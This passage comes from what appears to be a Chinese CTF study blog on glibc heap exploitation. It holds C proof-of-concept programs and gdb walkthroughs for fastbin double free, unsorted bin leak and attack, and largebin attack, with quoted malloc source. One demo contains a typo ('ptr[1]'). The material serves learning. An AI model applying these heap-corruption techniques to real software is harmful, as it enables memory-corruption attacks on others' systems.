class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png"></p><p>我们分别在每一次的 free 和 malloc 处下断点，gdb 中的流程如下：</p><p>第一次 free ptr1，ptr1的地址进入 fast bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png"></p><p>第一次 free ptr2，ptr2 的地址进入 fast bin ，此时 ptr1 的 fd 指针指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png"></p><p>第二次 free ptr1，此时 ptr2 的 fd 指针指向 ptr1，ptr1 的 fd 指针仍然指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png"></p><p>第一次 malloc，最后进的 ptr1 被分配出去</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png"></p><p>第二次 malloc， ptr2 被分配出去，但因为因为 ptr2 的 fd 指针指向 ptr1，所以系统仍然认为 ptr1 在 fast bin 中，位置在 ptr2之后（这个图是我们对 ptr1进行了一些 fd 混淆的操作之后截的所以 ptr1 的指针指向 stack）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png"></p><p>第三次malloc就会把 ” 系统以为仍然在fast bin 里 “ 的 ptr1分配出去。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png"></p><p>最后再一次malloc，就会把我们改写后的地址分配给堆啦</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png"></p><h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>简单回顾一下 unsortedbin 的基本来源和使用情况：</p><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个比较大的 chunk 被分为两个部分之后，如果剩下的部分大于 minsize ，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk ，并且这个 chunk 不和 top chunk 紧邻，这个 chunk 就会被放进 unsorted bin 中</li><li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li></ul><h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin 采用 FIFO，即先进后出的顺序释放，也就是说从 unsortedbin 中取堆块的时候是从尾部取所以 unsorted bin 使用 bk 指针遍历堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块并入Top chunk中</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//分别是fd 指针和 bk 指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gdb 中的调试是这样的：</p><p>free 之后的堆结构及内存</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png"></p><p>如果你运行了上面的代码，就会发现 unsorted bin 中只有一个 chunk 时，bin 的 fd 指针和 bk 指针都指向 main_arena 。同样，如果有多个，头部 bin 的 fd 会指向 main_arena 。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png"></p><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址。以 pwntools 为例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><p>在 _int_malloc 中由一段与 bk 指针有关的代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//将 unsorted bin 链表的头指针的 bk字段设置为 bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><p>unsorted_chunks (av) 用于获取 unsortedbin 双向链表头部的指针</p><p>unsorted_chunks (av) 的两个重要元素：</p><p>fd：bin [0]（指向下一块数据，这里指向 unsorted bin 链表的头部）</p><p>bk：bin [1]（指向前一块数据，这里指向 unsorted bin 链表的尾部）</p></blockquote><p>unsorted bin 从尾部依次往前遍历，由于遍历到一个 chunk 就会进行脱链，所以如果要访问到下一个 chunk，只需要访问 <strong>unsorted_chunks (av)-&gt;bk</strong> 就可以了，而且当 bk 内容为 <strong>unsorted_chunks (av)</strong> 则可以说明全部数据已经被遍历，unsortbin 无内容了。</p><p>代码的后两行在做的就是把 victim 中链表中移除。在这个过程中，就利用 <code>bck-&gt;fd = unsorted_chunks (av);</code> 往上面写了一个 <strong>unsorted_chunks (av) 的地址</strong>，这是一个在 libc 上的地址，由 0x7f 开头，是一个很大的数字。</p><p>也就是说我们如果控制了 bck ，那么就可以在脱链的过程中，往 <strong>victim-&gt;bk-&gt;fd</strong> 写入一个很大的数字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//目标写入的栈</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//防止与 top chunk 合并</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p 的 bk 指向target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体流程如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png"></p><p>初始状态的时候，unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 </p><p>执行 free(p) ，释放的 chunk 进入 unsortedbin </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png"></p><p>修改 p[1] 之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png"></p><p>再次申请 chunk，就会从 unsortedbin 中取出，此时 unsortedbin 中的结构变成</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png"></p><p>最后结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png"></p><h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote><p>搞这里的时候头昏昏的，先这么放着，待修改😶‍🌫️</p></blockquote><h3 id="largebin-复习"><a href="#largebin-复习" class="headerlink" title="largebin 复习"></a>largebin 复习</h3><p>大于512（1024）字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk </p><p>被释放进 Large Bin 中的 chunk ，除了和其他的 bin 相同的 prev_size、size、fd、bk 这几个结构之外，还具有 fd_nextsize 和 bk_nextsize :</p><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li></ul><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适 chunk 时挨个遍历,提高了工作效率。</p><p>排列顺序：</p><ol><li><p>按照大小顺序从小到大排序</p></li><li><p>如果大小相同就按照 free 的先后顺序排序</p></li></ol><p>多个大小相同的堆块，只有首个堆块的 fd_nextsize 和 bk_nextsize 会指向其他堆块，后买你堆块的这两个指针均为0。size 最大的堆块的 bk_nextsize 指向最小的堆块，size 最小的堆块的 fd_nextsize 指向最大的堆块</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//防止合并，下同</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br><br> <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">free</span>(p3);<br><br> p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size 设置为 0x3f1</span><br> p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd 置空</span><br> p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize 置空</span><br>p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk 修改为 stack_var1_addr - 0x10</span><br>p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize 修改为 stack_var1_addr - 0x20</span><br><br> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>第一轮 malloc 结束，堆结构如下，p1、p2、p3 的地址分别是 0x602000 、 0x602360 、 0x6027a0</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png"></p><p>释放掉 p1 和 p2，两个堆块都进入 unsortedbin 中 ，要注意的是，p1 的大小是 0x330 大小属于 small bin，而 p2 的大小是 0x410 属于 large bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png"></p><p>用 <code>malloc(0x90);</code> 分割堆块，所以原本的堆块被分割，剩余的部分进入了 largebin 。</p><p>实际上详细的流程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>所以会出现下图的堆结构：unsorted bin 中有一个 chunk 大小是 0x330 - 0xa0 &#x3D; 0x290 ；large bin 某一个序列的 bin 中有一个 chunk 大小是 0x410</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png"></p><p>free 掉 p3 ，p3 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png"></p><p>接下来修改 p2 的信息，修改前后依次如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png"></p><p>修改后的结果如下：</p><table><thead><tr><th>size</th><th>fd</th><th>bk</th><th>fd_nextsize</th><th>bk_nextsize</th></tr></thead><tbody><tr><td>0x3f1</td><td>0</td><td>stack_var1_addr - 0x10</td><td>0</td><td>stack_var2_addr - 0x20</td></tr></tbody></table><p>我们记这个 stack_var1 - 0x10 为 fakechunk1，此时 stack_var1 - 0x10 的 fd 指针指向 fakechunk1 ，同时 stack_var2 - 0x20 为 fakechunke2 ，此时 stack_var2 - 0x20 的 fd 指针指向 fakechunk2。</p><p>接下来我们再次 <code>malloc(0x90)</code>, p3 挂进了 largebin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png"></p><p>具体有关这个部分的 malloc 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>这次我们从 unsortedbin 中拿出的是属于 largebin，所以进入到堆块大小判断的 else 分支，接下来就是指针的操作，由于我们的 p3 被我们修改过数据，就会跳过 while 的循环，进入下面的部分分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>fwd = fwd-&gt;fd_nextsize;<br>assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>victim-&gt;fd_nextsize = fwd;<br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>fwd-&gt;bk_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以在下面的代码中，我们被修改的指针就完成了利用，修改了 stack_var1 和stack_var2 的值。</p><hr><p>觉得堆题还是要去分析一下源码，接下来就计划去看看源码</p><p><del>先做几道题练练手</del></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机和主机之间互传文件及复制粘贴的实现</title>
    <link href="/2023/08/04/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E4%BA%92%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%8A%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
